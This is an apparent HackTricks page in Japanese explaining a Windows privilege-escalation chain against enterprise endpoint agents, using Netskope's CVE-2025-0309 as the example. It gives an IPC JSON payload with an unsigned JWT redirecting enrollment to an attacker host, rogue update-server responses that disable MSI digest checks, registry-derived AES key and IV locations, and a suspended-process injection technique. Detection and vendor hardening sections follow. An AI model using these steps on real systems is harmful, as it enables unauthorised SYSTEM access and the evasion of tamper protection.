# エンタープライズ Auto‑Updaters と Privileged IPC の悪用 (e.g., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

このページでは、低摩擦な IPC サーフェスと特権付きのアップデートフローを公開しているエンタープライズ向けエンドポイントエージェントやアップデータに見られる、Windows のローカル権限昇格チェーンの一群を一般化して説明します。代表例として Netskope Client for Windows < R129 (CVE-2025-0309) があり、低権限ユーザーが攻撃者管理下のサーバーへの登録（enrollment）を強制し、その後 SYSTEM サービスがインストールする悪意のある MSI を配布できます。

再利用可能な主なアイデア:
- 特権サービスの localhost IPC を悪用して、攻撃者サーバーへの再登録や再設定を強制する。
- ベンダーの update endpoints を実装し、rogue Trusted Root CA を配布して、updater を悪意のある “signed” パッケージへ向ける。
- 弱い signer チェック（CN allow‑lists）、任意の digest フラグ、および緩い MSI プロパティを回避する。
- IPC が “encrypted” 場合、registry に保存された world‑readable な機械識別子から key/IV を導出する。
- サービスが image path/process name によって呼び出し元を制限する場合は、allow‑listed プロセスへインジェクトするか、プロセスを suspended で生成して最小限の thread‑context patch により DLL をブートストラップする。

---
## 1) localhost IPC を介して攻撃者サーバーへの登録を強制する

多くのエージェントはユーザーモードの UI プロセスを同梱し、JSON を使って SYSTEM サービスと localhost TCP 上で通信します。

Netskope での観測例:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) claims でバックエンドホストを制御できる JWT 登録トークンを作成する（例: AddonUrl）。署名は不要なので alg=None を使用する。
2) provisioning コマンドを呼び出す IPC メッセージにあなたの JWT と tenant 名を載せて送信する:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) サービスが登録/構成取得のためにあなたの不正なサーバーへアクセスし始める。例：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name‑based, originate the request from a allow‑listed vendor binary (see §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

Once the client talks to your server, implement the expected endpoints and steer it to an attacker MSI. Typical sequence:

1) /v2/config/org/clientconfig → 非常に短い更新間隔を持つJSON configを返す。例：
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate を返す。サービスはそれを Local Machine Trusted Root store にインストールする。
3) /v2/checkupdate → 悪意のある MSI と偽のバージョンを指すメタデータを返す。

Bypassing common checks seen in the wild:
- Signer CN allow‑list: サービスは Subject CN が “netSkope Inc” または “Netskope, Inc.” と等しいかだけを確認する場合がある。あなたの rogue CA はその CN を持つ leaf を発行して MSI に署名できる。
- CERT_DIGEST property: CERT_DIGEST という名前の無害な MSI プロパティを含める。インストール時に強制されない。
- Optional digest enforcement: 設定フラグ（例: check_msi_digest=false）が追加の暗号検証を無効にする。

Result: SYSTEM サービスは C:\ProgramData\Netskope\stAgent\data\*.msi からあなたの MSI をインストールし、NT AUTHORITY\SYSTEM として任意のコードを実行する。

---
## 3) Forging encrypted IPC requests (when present)

R127 以降、Netskope は IPC JSON を Base64 に見える encryptData フィールドでラップしていた。リバースでは、AES がレジストリ値から派生した key/IV を使っていることが判明した（これらは任意のユーザーで読み取り可能）:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻撃者はこの暗号化を再現して標準ユーザーから有効な暗号化コマンドを送信できる。一般的なヒント: エージェントが突然 IPC を「暗号化」し始めたら、HKLM 以下の device ID、product GUID、install ID 等を鍵材として探せ。

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

一部のサービスは TCP 接続の PID を解決してピアを認証し、Program Files 配下の allow‑listed ベンダー実行ファイル（例: stagentui.exe, bwansvc.exe, epdlp.exe）のイメージパス／名前と比較する。

実用的なバイパス例:
- allow‑listed プロセス（例: nsdiag.exe）への DLL injection を行い、その内部から IPC をプロキシする。
- allow‑listed バイナリを CREATE_SUSPENDED で起動し、CreateRemoteThread を使わずにプロキシ DLL をブートストラップして、ドライバーによる改ざん防止ルールを満たす（see §5）。

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

製品はしばしば minifilter/OB callbacks ドライバー（例: Stadrv）を同梱し、保護されたプロセスのハンドルから危険な権限を取り除く:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME を削除
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE に制限

これらの制約を尊重する信頼できる user‑mode ローダーの手順:
1) ベンダーのバイナリを CREATE_SUSPENDED で CreateProcess する。
2) まだ取得可能なハンドルを得る: プロセスに対して PROCESS_VM_WRITE | PROCESS_VM_OPERATION、スレッドに対して THREAD_GET_CONTEXT/THREAD_SET_CONTEXT（または既知の RIP にコードパッチを当てるなら THREAD_RESUME のみ）。
3) ntdll!NtContinue（またはその他の早期に確実にマップされるスローシンク）を、あなたの DLL パスで LoadLibraryW を呼び、その後ジャンプバックする小さなスタブで上書きする。
4) ResumeThread してプロセス内でスタブをトリガーし、DLL をロードさせる。

あなたは既に保護されたプロセスに対して PROCESS_CREATE_THREAD や PROCESS_SUSPEND_RESUME を使っていない（自分で作成した）ため、ドライバーのポリシーは満たされる。

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) は rogue CA、悪意のある MSI の署名、自動化されたエンドポイント (/v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate) の提供を自動化する。
- UpSkope は任意（オプションで AES 暗号化）の IPC メッセージを作成できるカスタム IPC クライアントで、allow‑listed バイナリから発信するための suspended‑process 注入も含む。

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root への追加を監視する。Sysmon + registry‑mod eventing（SpecterOps のガイダンス参照）が有効。
- C:\ProgramData\<vendor>\<agent>\data\*.msi のようなパスからエージェントのサービスによって開始された MSI 実行をフラグ付けする。
- エージェントログを確認して予期しない enrollment ホスト／テナントを探す。例: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant の異常や provisioning msg 148 を確認。
- 期待される署名済みバイナリではない、あるいは通常とは異なる子プロセスツリーから発生する localhost IPC クライアントをアラートする。

---
## Hardening tips for vendors
- enrollment/update ホストを厳格な allow‑list に縛り、clientcode 内で信頼できないドメインを拒否する。
- IPC ピアを image path/name チェックではなく OS のプリミティブ（ALPC security、named‑pipe SIDs 等）で認証する。
- 秘密情報を world‑readable な HKLM に置かないこと。もし IPC を暗号化するなら、保護されたシークレットから鍵を派生するか、認証済みチャネル上でネゴシエートする。
- updater をサプライチェーン上の攻撃面として扱う: あなたが管理する信頼できる CA への完全なチェーンを要求し、パッケージ署名をピン留めした鍵に対して検証し、設定で検証が無効化されている場合は fail closed する。

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
